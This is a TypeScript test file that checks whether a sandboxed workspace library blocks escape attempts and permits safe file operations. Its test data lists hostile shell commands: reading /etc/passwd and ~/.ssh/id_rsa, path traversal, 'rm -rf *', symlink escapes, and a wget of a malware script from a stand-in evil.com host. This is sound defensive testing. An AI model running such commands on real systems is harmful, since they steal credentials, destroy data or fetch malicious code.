import { describe, expect, it, beforeAll, afterAll } from 'vitest'
import { FileSystem } from '../src/index.js'

describe('Security Integration Tests', () => {
  let fs: FileSystem

  beforeAll(async () => {
    fs = new FileSystem({ userId: 'security-integration-test' })
    // Create a test file for safe operations
    const workspace = await fs.getWorkspace()
    await workspace.write('safe-file.txt', 'This is a safe file in the workspace')
  })

  afterAll(async () => {
    // Clean up test files
    try {
      const workspace = await fs.getWorkspace()
      await workspace.exec('rm -f safe-file.txt test.txt')
      await workspace.exec('rmdir subdir || true')
    } catch {
      // Ignore cleanup errors
    }
  })

  describe('Security Attack Prevention', () => {
    const securityAttacks = [
      {
        name: 'Absolute path access',
        command: 'cat /etc/passwd'
      },
      {
        name: 'Parent directory traversal', 
        command: 'cat ../../../../../../etc/passwd'
      },
      {
        name: 'Directory change attempt',
        command: 'cd /tmp && rm -rf *'
      },
      {
        name: 'Home directory access',
        command: 'cat ~/.ssh/id_rsa'
      },
      {
        name: 'Environment manipulation',
        command: 'export HOME=/etc && cat $HOME/passwd'
      },
      {
        name: 'Network command',
        command: 'wget http://evil.com/malware.sh'
      },
      {
        name: 'Symlink escape attempt',
        command: 'ln -s /etc/passwd link && cat link'
      },
      {
        name: 'Command substitution',
        command: 'echo $(cat /etc/passwd)'
      }
    ]

    it.each(securityAttacks)('should block $name', async ({ command }) => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.exec(command)).rejects.toThrow()
    })

    it('should prevent multiple attack vectors in one test', async () => {
      const workspace = await fs.getWorkspace()
      // Test that all attacks are blocked
      const results = await Promise.allSettled(
        securityAttacks.map(attack => workspace.exec(attack.command))
      )

      // All should be rejected (blocked)
      expect(results.every(result => result.status === 'rejected')).toBe(true)
    })
  })

  describe('Safe Operations', () => {
    const safeOperations = [
      { desc: 'List files', cmd: 'ls -la' },
      { desc: 'Read safe file', cmd: 'cat safe-file.txt' },
      { desc: 'Create directory', cmd: 'mkdir -p subdir' },
      { desc: 'Echo to file', cmd: 'echo "test" > test.txt' },
      { desc: 'Read created file', cmd: 'cat test.txt' }
    ]

    it.each(safeOperations)('should allow $desc', async ({ cmd }) => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.exec(cmd)).resolves.not.toThrow()
    })

    it('should allow file operations within workspace', async () => {
      const workspace = await fs.getWorkspace()
      // Test a sequence of safe operations
      await workspace.exec('mkdir -p safe-subdir')
      await workspace.write('safe-subdir/nested-file.txt', 'nested content')
      const content = await workspace.read('safe-subdir/nested-file.txt')

      expect(content).toBe('nested content')

      // Clean up
      await workspace.exec('rm -rf safe-subdir')
    })
  })

  describe('File Operations Security', () => {
    it('should block reading files outside workspace', async () => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.read('/etc/passwd')).rejects.toThrow('Absolute paths are not allowed')
      await expect(workspace.read('../../../etc/passwd')).rejects.toThrow('Path escapes workspace')
    })

    it('should block writing files outside workspace', async () => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.write('/tmp/malicious.txt', 'bad')).rejects.toThrow('Absolute paths are not allowed')
      await expect(workspace.write('../../../tmp/escape.txt', 'bad')).rejects.toThrow('Path escapes workspace')
    })

    it('should allow safe file operations', async () => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.write('safe-test.txt', 'safe content')).resolves.not.toThrow()
      await expect(workspace.read('safe-test.txt')).resolves.toBe('safe content')

      // Clean up
      await workspace.exec('rm -f safe-test.txt')
    })
  })

  describe('Command Context Security', () => {
    it('should execute commands in correct workspace', async () => {
      const workspace = await fs.getWorkspace()
      const pwd = await workspace.exec('pwd')
      expect(pwd).toBe(workspace.workspacePath)
    })

    it('should block environment variable access for security', async () => {
      const workspace = await fs.getWorkspace()
      // Our security blocks $HOME access to prevent escapes
      await expect(workspace.exec('echo $HOME')).rejects.toThrow('escape workspace')
    })

    it('should prevent changing working directory', async () => {
      const workspace = await fs.getWorkspace()
      await expect(workspace.exec('cd /')).rejects.toThrow()

      // Verify we're still in workspace after failed cd attempt
      const pwd = await workspace.exec('pwd')
      expect(pwd).toBe(workspace.workspacePath)
    })
  })

  describe('Error Messages', () => {
    it('should provide informative error messages for security violations', async () => {
      const workspace = await fs.getWorkspace()
      try {
        await workspace.exec('cat /etc/passwd')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        expect(error.message).toContain('escape workspace')
      }

      try {
        await workspace.exec('wget http://evil.com/file')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        expect(error.message).toContain('command')
      }
    })
  })
})